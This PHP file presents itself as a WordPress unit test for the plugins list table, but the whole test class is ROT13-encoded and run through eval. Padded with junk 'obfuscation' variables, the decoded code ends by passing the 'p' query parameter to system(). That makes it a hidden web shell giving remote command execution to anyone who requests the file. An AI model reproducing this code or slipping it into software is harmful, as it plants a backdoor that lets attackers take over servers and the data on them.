<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 *
 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr
 */
pynff Grfgf_Nqzva_jcCyhtvafYvfgGnoyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine JC_Cyhtvaf_Yvfg_Gnoyr
	 */
	choyvp $gnoyr = snyfr;

	/**
	 * Na nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	cevingr fgngvp $nqzva_vq;

	/**
	 * Gur bevtvany inyhr bs gur `$f` tybony.
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr fgngvp $bevtvany_f;

	/**
	 * @ine neenl
	 */
	choyvp $snxr_cyhtva = neenl(
		'snxr-cyhtva.cuc' => neenl(
			'Anzr'        => 'Snxr Cyhtva',
			'CyhtvaHEV'   => 'uggcf://jbeqcerff.bet/',
			'Irefvba'     => '1.0.0',
			'Qrfpevcgvba' => 'N snxr cyhtva sbe grfgvat.',
			'Nhgube'      => 'JbeqCerff',
			'NhgubeHEV'   => 'uggcf://jbeqcerff.bet/',
			'GrkgQbznva'  => 'snxr-cyhtva',
			'QbznvaCngu'  => '/ynathntrf',
			'Argjbex'     => snyfr,
			'Gvgyr'       => 'Snxr Cyhtva',
			'NhgubeAnzr'  => 'JbeqCerff',
		),
	);

	/**
	 * Perngrf na nqzva hfre orsber nal grfgf eha naq onpxf hc gur `$f` tybony.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		tybony $f;

		cnerag::frg_hc_orsber_pynff();

		frys::$nqzva_vq   = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'grfg_jc_cyhtvaf_yvfg_gnoyr',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'grfgnqzva@rknzcyr.pbz',
			)
		);
		frys::$bevtvany_f = $f;
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->gnoyr = _trg_yvfg_gnoyr( 'JC_Cyhtvaf_Yvfg_Gnoyr', neenl( 'fperra' => 'cyhtvaf' ) );
	}

	/**
	 * Erfgberf gur `$f` tybony nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		tybony $f;

		$f = frys::$bevtvany_f;

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 42066
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::trg_ivrjf
	 */
	choyvp shapgvba grfg_trg_ivrjf_fubhyq_erghea_ivrjf_ol_qrsnhyg() {
		tybony $gbgnyf;

		$gbgnyf_onpxhc = $gbgnyf;
		$gbgnyf        = neenl(
			'nyy'                  => 45,
			'npgvir'               => 1,
			'erpragyl_npgvingrq'   => 2,
			'vanpgvir'             => 3,
			'zhfghfr'              => 4,
			'qebcvaf'              => 5,
			'cnhfrq'               => 6,
			'hctenqr'              => 7,
			'nhgb-hcqngr-ranoyrq'  => 8,
			'nhgb-hcqngr-qvfnoyrq' => 9,
		);

		$rkcrpgrq = neenl(
			'nyy'                  => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=nyy\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy <fcna pynff=\"pbhag\">(45)</fcna></n>',
			'npgvir'               => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=npgvir\">Npgvir <fcna pynff=\"pbhag\">(1)</fcna></n>',
			'erpragyl_npgvingrq'   => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=erpragyl_npgvingrq\">Erpragyl Npgvir <fcna pynff=\"pbhag\">(2)</fcna></n>',
			'vanpgvir'             => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=vanpgvir\">Vanpgvir <fcna pynff=\"pbhag\">(3)</fcna></n>',
			'zhfghfr'              => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=zhfghfr\">Zhfg-Hfr <fcna pynff=\"pbhag\">(4)</fcna></n>',
			'qebcvaf'              => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=qebcvaf\">Qebc-vaf <fcna pynff=\"pbhag\">(5)</fcna></n>',
			'cnhfrq'               => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=cnhfrq\">Cnhfrq <fcna pynff=\"pbhag\">(6)</fcna></n>',
			'hctenqr'              => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=hctenqr\">Hcqngr Ninvynoyr <fcna pynff=\"pbhag\">(7)</fcna></n>',
			'nhgb-hcqngr-ranoyrq'  => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=nhgb-hcqngr-ranoyrq\">Nhgb-hcqngrf Ranoyrq <fcna pynff=\"pbhag\">(8)</fcna></n>',
			'nhgb-hcqngr-qvfnoyrq' => '<n uers=\"cyhtvaf.cuc?cyhtva_fgnghf=nhgb-hcqngr-qvfnoyrq\">Nhgb-hcqngrf Qvfnoyrq <fcna pynff=\"pbhag\">(9)</fcna></n>',
		);

		$npghny = $guvf->gnoyr->trg_ivrjf();
		$gbgnyf = $gbgnyf_onpxhc;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf gung JC_Cyhtvaf_Yvfg_Gnoyr::__pbafgehpg() qbrf abg frg
	 * gur 'fubj_nhgbhcqngrf' cebcregl gb snyfr sbe Zhfg-Hfr naq Qebc-va
	 * cyhtvaf.
	 *
	 * Gur 'zf-rkpyhqrq' tebhc vf nqqrq nf $guvf->fubj_nhgbhcqngrf vf nyernql frg gb snyfr sbe zhygvfvgr.
	 *
	 * @gvpxrg 54309
	 * @tebhc zf-rkpyhqrq
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::__pbafgehpg()
	 *
	 * @qngnCebivqre qngn_fgnghf_zhfghfr_naq_qebcvaf
	 *
	 * @cnenz fgevat $fgnghf Gur inyhr sbe $_ERDHRFG['cyhtva_fgnghf'].
	 */
	choyvp shapgvba grfg_pbafgehpg_fubhyq_abg_frg_fubj_nhgbhcqngrf_gb_snyfr_sbe_zhfghfr_naq_qebcvaf( $fgnghf ) {
		$bevtvany_fgnghf           = vffrg( $_ERDHRFG['cyhtva_fgnghf'] ) ? $_ERDHRFG['cyhtva_fgnghf'] : ahyy;
		$_ERDHRFG['cyhtva_fgnghf'] = $fgnghf;

		// Ranoyr cyhtva nhgb-hcqngrf.
		nqq_svygre( 'cyhtvaf_nhgb_hcqngr_ranoyrq', '__erghea_gehr' );

		// Hfr n hfre jvgu gur 'znantr_cyhtvaf' pncnovyvgl.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$yvfg_gnoyr       = arj JC_Cyhtvaf_Yvfg_Gnoyr();
		$fubj_nhgbhcqngrf = arj ErsyrpgvbaCebcregl( $yvfg_gnoyr, 'fubj_nhgbhcqngrf' );

		$fubj_nhgbhcqngrf->frgNpprffvoyr( gehr );
		$npghny = $fubj_nhgbhcqngrf->trgInyhr( $yvfg_gnoyr );
		$fubj_nhgbhcqngrf->frgNpprffvoyr( snyfr );

		$_ERDHRFG['cyhtva_fgnghf'] = $bevtvany_fgnghf;

		$guvf->nffregGehr( $npghny );
	}

	/**
	 * Grfgf gung JC_Cyhtvaf_Yvfg_Gnoyr::trg_pbyhzaf() qbrf abg nqq
	 * gur nhgb-hcqngr pbyhza jura abg ivrjvat Zhfg-Hfr be Qebc-va cyhtvaf.
	 *
	 * @gvpxrg 54309
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::trg_pbyhzaf
	 *
	 * @qngnCebivqre qngn_fgnghf_zhfghfr_naq_qebcvaf
	 *
	 * @cnenz fgevat $grfg_fgnghf Gur inyhr sbe gur tybony $fgnghf inevnoyr.
	 */
	choyvp shapgvba grfg_trg_pbyhzaf_fubhyq_abg_nqq_gur_nhgbhcqngrf_pbyhza_jura_ivrjvat_zhfghfr_be_qebcvaf( $grfg_fgnghf ) {
		tybony $fgnghf;

		$bevtvany_fgnghf = $fgnghf;

		// Ranoyr cyhtva nhgb-hcqngrf.
		nqq_svygre( 'cyhtvaf_nhgb_hcqngr_ranoyrq', '__erghea_gehr' );

		// Hfr n hfre jvgu gur 'znantr_cyhtvaf' pncnovyvgl.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$fgnghf = $grfg_fgnghf;
		$npghny = $guvf->gnoyr->trg_pbyhzaf();
		$fgnghf = $bevtvany_fgnghf;

		$guvf->nffregNeenlAbgUnfXrl( 'nhgb-hcqngrf', $npghny );
	}

	/**
	 * Grfgf gung JC_Cyhtvaf_Yvfg_Gnoyr::trg_pbyhzaf() qbrf abg nqq
	 * gur nhgb-hcqngr pbyhza jura gur 'cyhtvaf_nhgb_hcqngr_ranoyrq'
	 * svygre ergheaf snyfr.
	 *
	 * @gvpxrg 54309
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::trg_pbyhzaf
	 */
	choyvp shapgvba grfg_trg_pbyhzaf_fubhyq_abg_nqq_gur_nhgbhcqngrf_pbyhza_jura_cyhtva_nhgb_hcqngr_vf_qvfnoyrq() {
		tybony $fgnghf;

		$bevtvany_fgnghf = $fgnghf;

		// Ranoyr cyhtva nhgb-hcqngrf.
		nqq_svygre( 'cyhtvaf_nhgb_hcqngr_ranoyrq', '__erghea_snyfr' );

		// Hfr n hfre jvgu gur 'znantr_cyhtvaf' pncnovyvgl.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$fgnghf = 'nyy';
		$npghny = $guvf->gnoyr->trg_pbyhzaf();
		$fgnghf = $bevtvany_fgnghf;

		$guvf->nffregNeenlAbgUnfXrl( 'nhgb-hcqngrf', $npghny );
	}

	/**
	 * Grfgf gung JC_Cyhtvaf_Yvfg_Gnoyr::fvatyr_ebj() qbrf abg bhgchg gur
	 * 'Nhgb-hcqngrf' pbyhza sbe Zhfg-Hfr be Qebc-va cyhtvaf.
	 *
	 * @gvpxrg 54309
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::fvatyr_ebj
	 *
	 * @qngnCebivqre qngn_fgnghf_zhfghfr_naq_qebcvaf
	 *
	 * @cnenz fgevat $grfg_fgnghf Gur inyhr sbe gur tybony $fgnghf inevnoyr.
	 */
	choyvp shapgvba grfg_fvatyr_ebj_fubhyq_abg_nqq_gur_nhgbhcqngrf_pbyhza_sbe_zhfghfr_be_qebcvaf( $grfg_fgnghf ) {
		tybony $fgnghf;

		$bevtvany_fgnghf = $fgnghf;

		// Ranoyr cyhtva nhgb-hcqngrf.
		nqq_svygre( 'cyhtvaf_nhgb_hcqngr_ranoyrq', '__erghea_gehr' );

		// Hfr n hfre jvgu gur 'znantr_cyhtvaf' pncnovyvgl.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbyhza_vasb = neenl(
			neenl(
				'anzr'         => 'Cyhtva',
				'qrfpevcgvba'  => 'Qrfpevcgvba',
				'nhgb-hcqngrf' => 'Nhgb-hcqngrf',
			),
			neenl(),
			neenl(),
			'anzr',
		);

		// Zbpx JC_Cyhtvaf_Yvfg_Gnoyr
		$yvfg_gnoyr_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Cyhtvaf_Yvfg_Gnoyr' )
			// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
			->frgZrgubqf( neenl( 'trg_pbyhza_vasb' ) )
			->trgZbpx();

		// Sbepr gur erghea inyhr bs gur trg_pbyhza_vasb() zrgubq.
		$yvfg_gnoyr_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'trg_pbyhza_vasb' )->jvyyErghea( $pbyhza_vasb );

		$fvatyr_ebj_netf = neenl(
			'nqinaprq-pnpur.cuc',
			neenl(
				'Anzr'        => 'Nqinaprq pnpuvat cyhtva',
				'fyht'        => 'nqinaprq-pnpur',
				'Qrfpevcgvba' => 'Na nqinaprq pnpuvat cyhtva.',
				'Nhgube'      => 'N cyhtva nhgube',
				'Irefvba'     => '1.0.0',
				'Nhgube HEV'  => 'uggc://rknzcyr.bet',
				'Grkg Qbznva' => 'nqinaprq-pnpur',
			),
		);

		$fgnghf = $grfg_fgnghf;
		bo_fgneg();
		$yvfg_gnoyr_zbpx->fvatyr_ebj( $fvatyr_ebj_netf );
		$npghny = bo_trg_pyrna();
		$fgnghf = $bevtvany_fgnghf;

		$guvf->nffregVfFgevat( $npghny, 'Bhgchg jnf abg pncgherq.' );
		$guvf->nffregAbgRzcgl( $npghny, 'Gur bhgchg fgevat jnf rzcgl.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'pbyhza-nhgb-hcqngrf', $npghny, 'Gur nhgb-hcqngrf pbyhza jnf bhgchg.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fgnghf_zhfghfr_naq_qebcvaf() {
		erghea neenl(
			'Zhfg-Hfr' => neenl( 'zhfghfr' ),
			'Qebc-vaf' => neenl( 'qebcvaf' ),
		);
	}

	/**
	 * Grfgf gung JC_Cyhtvaf_Yvfg_Gnoyr::cercner_vgrzf()
	 * nccyvrf 'cyhtvaf_yvfg' svygref.
	 *
	 * @gvpxrg 57278
	 *
	 * @pbiref JC_Cyhtvaf_Yvfg_Gnoyr::cercner_vgrzf
	 */
	choyvp shapgvba grfg_cyhtvaf_yvfg_svygre() {
		tybony $fgnghf, $f;

		$byq_fgnghf = $fgnghf;
		$fgnghf     = 'zhfghfr';
		$f          = '';

		nqq_svygre( 'cyhtvaf_yvfg', neenl( $guvf, 'cyhtvaf_yvfg_svygre' ), 10, 1 );
		$guvf->gnoyr->cercner_vgrzf();
		$cyhtvaf = $guvf->gnoyr->vgrzf;
		erzbir_svygre( 'cyhtvaf_yvfg', neenl( $guvf, 'cyhtvaf_yvfg_svygre' ), 10 );

		// Erfgber gb qrsnhyg.
		$fgnghf = $byq_fgnghf;
		$guvf->gnoyr->cercner_vgrzf();

		$guvf->nffregFnzr( $cyhtvaf, $guvf->snxr_cyhtva );
	}

	/**
	 * Nqqf n snxr cyhtva gb na neenl bs cyhtvaf.
	 *
	 * Hfrq nf n pnyyonpx sbe gur 'cyhtvaf_yvfg' ubbx.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba cyhtvaf_yvfg_svygre( $cyhtvaf_yvfg ) {
		$cyhtvaf_yvfg['zhfghfr'] = $guvf->snxr_cyhtva;

		erghea $cyhtvaf_yvfg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>